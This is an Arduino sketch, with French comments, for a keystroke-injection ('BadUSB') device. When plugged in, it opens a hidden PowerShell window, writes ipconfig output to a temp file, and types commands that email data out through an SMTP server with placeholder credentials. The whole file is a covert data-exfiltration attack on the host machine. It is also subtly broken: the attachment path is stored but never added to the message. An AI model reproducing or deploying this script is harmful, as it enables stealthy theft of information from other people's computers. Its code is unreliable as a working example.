#include "Keyboard.h"

void setup() {
  // Démarre la communication clavier
  Keyboard.begin();

  delay(1000);  // Délai initial

  // Simule "Windows+R" pour ouvrir la fenêtre "Exécuter"
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);  // Délai augmenté à 500 ms

  // Tape "powershell -WindowStyle hidden" pour ouvrir PowerShell en arrière-plan
  Keyboard.print("powershell -WindowStyle hidden");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);  // Délai augmenté à 500 ms

  // Commande pour enregistrer la sortie d'ipconfig dans un fichier
  Keyboard.print("ipconfig >> C:\\Windows\\Temp\\ipconfig.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1500);  // Délai augmenté à 1500 ms

  // Configuration des variables pour l'envoi de l'e-mail
  Keyboard.print("$emailSmtpServer = '$SMTP';");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$emailSmtpServerPort = $PORT;");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$emailSmtpUser = '$MAIL';");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$emailSmtpPass = '$PASSWORD';"); 
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$emailMessage = New-Object System.Net.Mail.MailMessage;");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$emailMessage.From = 'Mail<From>';"); 
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$emailMessage.To.Add('MailSend');");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$emailMessage.Body = 'See attachments';");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);  // Délai augmenté à 1000 ms

  Keyboard.print("$SMTPClient.EnableSsl = $true;");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(750);  // Délai augmenté à 750 ms

  // Ajoute une vérification avant d'ajouter la pièce jointe
  Keyboard.print("$attachment = 'C:\\Windows\\Temp\\ipconfig.txt';");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("$SMTPClient.Send($emailMessage);");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);  // Délai augmenté à 1000 ms

  // Ferme la fenêtre PowerShell
  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
}

void loop() {
  // Le script tourne une fois et s'arrête
}
